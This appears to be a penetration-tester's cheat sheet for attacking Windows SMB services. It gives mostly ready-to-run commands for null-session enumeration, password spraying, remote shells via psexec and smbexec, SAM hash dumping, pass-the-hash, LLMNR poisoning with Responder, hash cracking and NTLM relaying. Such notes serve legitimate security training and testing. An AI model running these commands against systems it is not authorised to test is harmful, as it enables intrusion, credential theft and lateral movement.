## Initial Enumeration

Scanning ports 139 and 445 to identify OS version, Samba version, and **SMB signing** status.

Identify service version and default script results

```
sudo nmap <TARGET_IP> -sV -sC -p139,445
```

- **Gotchas**: **Nmap** often fails to provide exact Windows versions and requires guessing.

## Null Session Enumeration

Accessing shares and system information when unauthenticated connectivity is permitted.

### File Share Enumeration

List shares using unauthenticated access

```
smbclient -N -L //<TARGET_IP>
```

Identify shares and explicit permissions for the current session

```
smbmap -H <TARGET_IP>
```

List directory contents recursively

```
smbmap -H <TARGET_IP> -r <SHARE_NAME>
```

Download a specific file from a share

```
smbmap -H <TARGET_IP> --download "<FILE_PATH>"
```

Upload a local file to a remote share

```
smbmap -H <TARGET_IP> --upload <FILE_PATH> "<SHARE_NAME>\<FILE_PATH>"
```

- **Tool comparison**:
    - smbclient: Basic interaction; requires `-N` for null sessions.
    - smbmap: Preferred for quick permission mapping and recursive listing.

### RPC Enumeration

Execute remote procedure calls to gather users or modify attributes via null session.

Connect to the RPC interface

```
rpcclient -U'%' <TARGET_IP>
```

Enumerate domain users once connected

```
enumdomusers
```

- **Gotchas**: **Specific configurations** are often required to allow system modifications through RPC.

### Automated Enumeration

Wrapper tool to automate collection of shares, users, groups, and NetBIOS info.

Run all enumeration checks

```
./enum4linux-ng.py <TARGET_IP> -A -C
```

## Password Attacks

Testing credentials when null sessions are disabled or targeting specific accounts.

### Password Spraying

Testing a single password against a list of users to bypass **account lockout** thresholds.

Spray a password against a user list

```
crackmapexec smb <TARGET_IP> -u <FILE_PATH> -p '<PASSWORD>' --local-auth
```

Continue testing after finding a valid credential

```
crackmapexec smb <TARGET_IP> -u <FILE_PATH> -p '<PASSWORD>' --continue-on-success
```

- **Gotchas**: **Account lockout** will occur if attempts exceed the target's threshold.

## Remote Code Execution

Executing commands on Windows targets using administrative credentials or hashes.

### Service-Based Execution

Spawn an interactive shell by deploying a service to the **ADMIN$** share.

Get a SYSTEM shell via Impacket

```
impacket-psexec <USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

Execute a single command via smbexec method

```
crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -x '<SERVICE_NAME>' --exec-method smbexec
```

- **Tool comparison**:
    - impacket-psexec: Provides a full interactive console.
    - CrackMapExec: Preferred for executing commands across multiple hosts simultaneously.
- **Edge cases**: If the default **atexec** method fails in CrackMapExec, manually specify `--exec-method smbexec`.

## Post-Exploitation Actions

Leveraging administrative access for credential harvesting and lateral movement.

### Credential Harvesting

Dump local SAM database hashes

```
crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --sam
```

Enumerate users currently logged into the system

```
crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --loggedon-users
```

### Pass-the-Hash

Authenticating to SMB services using a captured NTLM hash instead of a plaintext password.

Authenticate with a hash via CrackMapExec

```
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <HASH>
```

## Forced Authentication and Relaying

Capturing or redirecting network authentication traffic to gain access.

### Hash Capture

Poisoning LLMNR, NBT-NS, and MDNS traffic to steal **NetNTLM v1/v2** hashes.

Start the poisoner on a specific interface

```
sudo responder -I <INTERFACE_NAME>
```

Crack captured NetNTLMv2 hashes

```
hashcat -m 5600 <FILE_PATH> /usr/share/wordlists/rockyou.txt
```

### NTLM Relaying

Relaying captured authentication to a secondary target to execute commands or dump credentials.

Relay authentication to dump the SAM database

```
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>
```

Relay authentication to execute a Base64 encoded PowerShell shell

```
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c '<FILE_PATH>'
```

- **Dangerous / misconfigured settings**:
    - **SMB** must be set to **Off** in `/etc/responder/Responder.conf` before relaying.
- **Gotchas**: **Relay failure** occurs if the target has no more remaining targets or if authentication fails.

> ⚠️ Gap: Relaying will fail silently if **SMB Signing** is required on the target; the source only notes that signing status can be identified via Nmap.